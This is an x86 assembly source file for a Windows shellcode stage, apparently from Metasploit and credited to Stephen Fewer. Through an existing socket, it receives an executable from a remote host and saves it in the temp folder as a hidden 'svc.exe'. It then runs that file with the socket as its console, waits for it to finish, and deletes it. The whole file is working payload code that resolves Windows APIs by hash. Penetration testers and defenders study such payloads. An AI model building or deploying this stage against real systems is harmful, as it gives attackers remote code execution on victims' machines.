;-----------------------------------------------------------------------------;
; Author: Stephen Fewer (stephen_fewer[at]harmonysecurity[dot]com)
; Compatible: Windows 7, 2008, Vista, 2003, XP, 2000, NT4
; Version: 1.0 (28 July 2009)
; Size: 398 bytes
; Build: >build.py stage_upexec
;-----------------------------------------------------------------------------;
[BITS 32]
[ORG 0]

; By here EDI will be our socket and EBP will be the address of 'api_call' from stage 1.
; We reset EBP to the address of 'api_call' as found in this blob to avoid any problems
; if the old stage 1 location gets munged.

  cld                    ; Clear the direction flag.
  call start             ; Call start, this pushes the address of 'api_call' onto the stack.
delta:                   ;
%include "./src/block/block_api.asm"
start:                   ;
  pop ebp                ; Pop off the address of 'api_call' for calling later.
  ; create a file in a temp dir...
  push byte 127          ; Push down 127
  pop eax                ; And pop it into EAX
  shl eax, 3             ; Shift EAX left by 3 so it = 1016
  sub esp, eax           ; Alloc this space on the stack for the temp file path + name
  push esp               ; Push the buffer address
  push eax               ; Push the buffer size (127 * 4 = 508)
  push 0xE449F330        ; hash( "kernel32.dll", "GetTempPathA" )
  call ebp               ; GetTempPathA( 1016, &buffer );
  lea eax, [esp+eax]     ; EAX = pointer to the end of the temp path buffer (ESP point to the full path)
  mov dword [eax+0], 0x2E637673 ; Append the file name...
  mov dword [eax+4], 0x00657865 ; 'svc.exe',0
  ; Create the file...
  mov eax, esp           ; to save a few bytes, pace the file path pointer in EAX
  push eax               ; save the pointer to the file path for later
  push byte 0            ; We dont specify a template file handle
  push byte 6            ; The Flags and Attributes: FILE_ATTRIBUTE_HIDDEN|FILE_ATTRIBUTE_SYSTEM
  push byte 2            ; The Creation Disposition: CREATE_ALWAYS
  push byte 0            ; We dont specify a SECURITY_ATTRIBUTES structure
  push byte 7            ; The Share Mode: FILE_SHARE_DELETE|FILE_SHARE_READ|FILE_SHARE_WRITE
  push 0xE0000000        ; The Desired Access: GENERIC_EXECUTE|GENERIC_READ|GENERIC_WRITE
  push eax               ; The name of the file to create
  push 0x4FDAF6DA        ; hash( "kernel32.dll", "CreateFileA" )
  call ebp               ; CreateFileA( ... );
  mov ebx, eax           ; EBX = the new file handle
  ; Receive the size of the incoming file...
  push esp               ; Alloc a dword for the recv buffer param
  mov esi, esp           ; Save pointer
  push byte 0            ; Flags
  push byte 4            ; Length = sizeof( DWORD );
  push esi               ; The 4 byte buffer on the stack to hold the second stage length
  push edi               ; The saved socket
  push 0x5FC8D902        ; hash( "ws2_32.dll", "recv" )
  call ebp               ; recv( s, &dwLength, 4, 0 );
  ; Alloc a RW buffer for the incoming file...
  mov esi, [esi]         ; Dereference the pointer to the second stage length
  push byte 0x04         ; PAGE_READWRITE
  push 0x1000            ; MEM_COMMIT
  push esi               ; Push the newly recieved second stage length.
  push byte 0            ; NULL as we dont care where the allocation is.
  push 0xE553A458        ; hash( "kernel32.dll", "VirtualAlloc" )
  call ebp               ; VirtualAlloc( NULL, dwLength, MEM_COMMIT, PAGE_READWRITE );
  push ebx               ; Save the file handle for later call to CloseHandle
  ; setup the parameters for subsequent call to WriteFile (saves us trying to preserve various registers)
  push ebx               ; Alloc a dword for the bytes written param
  mov ecx, esp           ; Save this address
  push byte 0            ; null as we dont set an overlapped param
  push ecx               ; Pointer to the number of bytes written output param
  push esi               ; Push the buffer length
  push eax               ; Push the newly allocated RW buffer
  push ebx               ; Push the hFile param
  mov ebx, eax           ; EBX = our new memory address for the incoming file
  ; read in the incoming file...
read_more:               ;
  push byte 0            ; Flags
  push esi               ; Length
  push ebx               ; The current address into our incoming files RW buffer
  push edi               ; The saved socket
  push 0x5FC8D902        ; hash( "ws2_32.dll", "recv" )
  call ebp               ; recv( s, buffer, length, 0 );
  add ebx, eax           ; buffer += bytes_received
  sub esi, eax           ; length -= bytes_received
  test esi, esi          ; Test length
  jnz read_more          ; Continue if we have more to read
  ; write the entire files buffer to disk...
  push 0x5BAE572D        ; hash( "kernel32.dll", "WriteFile" )  
  call ebp               ; WriteFile( hFile, pBuffer, len, &out, 0 );
  pop ecx                ; Restore esp to the correct location for the next call
  ; close the file handle, we dont need to push the handle as it is allready pushed onto stack
  push 0x528796C6        ; hash( "kernel32.dll", "CloseHandle" )
  call ebp               ; CloseHandle( hFile );
  ; execute the file...
  push edi               ; Our socket becomes the processes hStdError
  push edi               ; Our socket becomes the processes hStdOutput
  push edi               ; Our socket becomes the processes hStdInput
  xor esi, esi           ; Clear ESI for all the NULL's we need to push
  push byte 18           ; We want to place (18 * 4) = 72 null bytes onto the stack
  pop ecx                ; Set ECX for the loop
push_loop2:              ;
  push esi               ; Push a null dword
  loop push_loop2        ; Keep looping untill we have pushed enough nulls
  mov word [esp+60], 0x0101 ; Set the STARTUPINFO Structure's dwFlags to STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW
  lea eax, [esp+16]      ; Set EAX as a pointer to our STARTUPINFO Structure
  mov byte [eax], 68     ; Set the size of the STARTUPINFO Structure
  ; perform the call to CreateProcessA
  push esp               ; Push the pointer to the PROCESS_INFORMATION Structure 
  push eax               ; Push the pointer to the STARTUPINFO Structure
  push esi               ; The lpCurrentDirectory is NULL so the new process will have the same current directory as its parent
  push esi               ; The lpEnvironment is NULL so the new process will have the same enviroment as its parent
  push esi               ; We dont specify any dwCreationFlags 
  inc esi                ; Increment ESI to be one
  push esi               ; Set bInheritHandles to TRUE in order to inheritable all possible handle from the parent
  dec esi                ; Decrement ESI back down to zero
  push esi               ; Set lpThreadAttributes to NULL
  push esi               ; Set lpProcessAttributes to NULL
  push dword [esp+120]   ; Set the lpCommandLine to run the file (Use the saved pointer to the file path)
  push esi               ; Set lpApplicationName to NULL as we are using the command line param instead
  push 0x863FCC79        ; hash( "kernel32.dll", "CreateProcessA" )
  call ebp               ; CreateProcessA( 0, &file, 0, 0, TRUE, 0, 0, 0, &si, &pi );
  ;  perform the call to WaitForSingleObject
  mov eax, esp           ; Save pointer to the PROCESS_INFORMATION Structure 
  dec esi                ; Decrement ESI down to -1 (INFINITE)
  push esi               ; Push INFINITE inorder to wait forever
  inc esi                ; Increment ESI back to zero
  push dword [eax]       ; Push the handle from our PROCESS_INFORMATION.hProcess
  push 0x601D8708        ; hash( "kernel32.dll", "WaitForSingleObject" )
  call ebp               ; WaitForSingleObject( pi.hProcess, INFINITE );
  ; close the socket...
  push edi               ; Push the socket to close
  push 0x614D6E75        ; hash( "ws2_32.dll", "closesocket" )
  call ebp               ; closesocket( s );
  ; delete the file...
  push dword [esp+88]    ; Push the saved pointer to the file path
  push 0x13DD2ED7        ; hash( "kernel32.dll", "DeleteFileA" )
  call ebp               ; DeleteFileA( &file );
  ; finish up with the EXITFUNK
%include "./src/block/block_exitfunk.asm" 
